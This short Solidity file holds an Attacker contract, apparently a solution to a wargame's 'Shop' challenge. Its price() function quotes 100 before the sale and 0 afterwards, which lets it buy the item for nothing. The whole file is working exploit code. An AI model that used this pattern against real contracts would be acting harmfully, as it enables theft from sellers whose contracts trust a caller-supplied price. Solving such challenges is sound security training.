pragma solidity ^0.8.0; 
//SPDX-License-Identifier: UNLICENSED

interface IShop {
    function buy() external;
    function isSold() external returns (bool);
}

/**
 */
contract Attacker {
    IShop private shop;
    
    /**
     */
    function price() external returns (uint)  {
        if (shop.isSold()) {
            return 0;
        }
        else {
            return 100;
        }
    }
    
    /**
     */
    function buy(address shopAddr) public {
        shop = IShop(shopAddr);
        shop.buy();
    }
}